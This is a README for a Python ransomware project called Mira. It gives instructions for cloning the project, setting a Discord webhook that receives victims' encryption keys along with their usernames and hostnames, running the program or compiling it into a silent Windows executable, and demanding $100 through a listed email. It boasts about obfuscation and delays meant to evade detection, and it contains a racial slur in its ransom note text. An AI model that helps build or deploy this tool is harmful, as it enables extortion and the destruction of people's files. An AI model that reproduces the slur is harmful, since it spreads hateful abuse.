# Mira Ransomware PoC

**MIRA RANSOMWARE** — simple Python file encryptor that fucks up user documents, photos, videos, archives and other shit people actually care about.

Targets common folders (Documents, Desktop, Downloads, Pictures, Videos, Music), encrypts files with Fernet, sends the decrypt key straight to your Discord webhook, and drops a big ugly "𝖸𝖮𝖴 𝖦𝖮𝖳 𝖬𝖨𝖱𝖠 𝖱𝖠𝖭𝖲𝖮𝖬𝖶𝖠𝖱𝖤 𝖭𝖨𝖦𝖦𝖠" note demanding $100 via email.

For "educational" / testing / research purposes only on systems you own. Don't be a dumbass and run this on random people's machines.

### Features
- Encrypts common file types: pdf, doc/docx, xls/xlsx, ppt/pptx, zip/rar/7z, txt, jpg/png, mp4/mkv/avi, mp3, db, sql, csv
- Exfils Fernet key (base64) + victim info (username, hostname, OS) to Discord webhook
- Random delays between encryptions to look less sketch
- Basic string obfuscation (rot13 + base64) on some parts
- Drops ransom note in every targeted folder
- $100 demand, contact via blaxkmira128@gmail.com

### Requirements
Python 3.8 – 3.12  
Install dependencies:

```bash
pip install -r requirements.txt
requirements.txt contents:
textcryptography==43.0.1
requests==2.32.3
Quick Start

Clone the repo:Bashgit clone https://github.com/blaxkmiradev/Mira-Ransomare.git
cd mira-ransomware
Install deps:Bashpip install -r requirements.txt
Edit mira.py — replace the webhook URL:Pythonwebhook_url = "https://discordapp.com/api/webhooks/YOUR_REAL_WEBHOOK_HERE"(optional: add/remove folders in target_folders or extensions in encrypt_these)
Run it:Bashpython ransomware.pyIt'll encrypt files in the target folders, ping your Discord, drop notes, and print how many files it hit.

Compile to Standalone EXE (Windows)
Bashpip install pyinstaller
pyinstaller --onefile --noconsole --clean mira.py
EXE ends up in dist/mira.exe — run it silently, no console window.
Decrypt Files (only you can do this)
Use Decrypt.py included in the repo.
Bashpython Decrypt.py

Paste the base64 key you received in Discord
It scans the same folders and decrypts everything it can find

If you fuck up the key → files stay encrypted. Double-check the base64 string.
Manual decrypt snippet (if you lost the script):
Pythonfrom cryptography.fernet import Fernet
import base64

key_b64 = "PASTE_BASE64_KEY_FROM_DISCORD"
key = base64.urlsafe_b64decode(key_b64)
f = Fernet(key)

with open("path/to/encrypted.file", "rb") as enc:
    data = f.decrypt(enc.read())
with open("path/to/decrypted.file", "wb") as out:
    out.write(data)
Notes / Warnings

This is kiddie-level ransomware. Real AV/EDR catches this shit quick (behavior + file mass encrypt + outbound request).
No persistence, no UAC bypass, no anti-analysis, no partial encryption — it's barebones.
Test on VM or junk folders first. Don't cry if you encrypt your own porn collection.
If you want it meaner (rename files .mira, screenshot + send to DC, kill AV processes, encrypt whole drive), hit me up — but that's next level.

MIRA out. Pay up or stay fucked.
